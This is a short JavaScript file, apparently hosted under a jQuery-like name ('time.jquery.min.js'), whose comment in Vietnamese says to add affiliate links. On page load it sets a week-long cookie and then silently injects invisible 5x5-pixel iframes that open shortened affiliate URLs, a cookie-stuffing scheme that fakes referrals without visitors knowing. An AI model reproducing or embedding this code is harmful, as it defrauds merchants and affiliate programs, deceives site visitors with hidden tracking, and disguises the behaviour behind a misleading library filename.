///https://cdn.jsdelivr.net/gh/hipacket/script/time.jquery.min.js
window.onload = function(){
  //thêm link aff tại đây
  var loaded = getCookie('saff');
  if(!loaded) {
    setCookie('saff',1,7);
    //var list = ['https://shorten.asia/b6Nvstes', 'https://shorten.asia/44h1EFtU'];
    var list = ['https://shorten.asia/pYrY9uPj', 'https://shorten.asia/RG2sUQkM'];
    setTimeout(() => {
      var node = document.createElement('iframe');
      node.width = 5;
      node.height = 5;
      node.style.cssText = 'padding:0;margin:0;border: 0;position: absolute;';
      list.forEach((url, i) => {
        setTimeout(() => {
          node.src = url;
          document.body.append(node.cloneNode());
        }, i*1000);
      })
    }, 6000);
  }
}
function setCookie(c_name,value,exdays) {
  var exdate=new Date();
  exdate.setDate(exdate.getDate() + exdays);
  var c_value=escape(value) + ((exdays==null) ? "" : "; expires="+exdate.toUTCString());
  document.cookie=c_name + '=' + c_value + '; path=/';
}
function getCookie(c_name) {
  var matches = new RegExp(c_name+'=(.*?)(;|$)','gi').exec(document.cookie);
  if(matches) {
    return matches[1];
  } else {
    return null;
  }
}
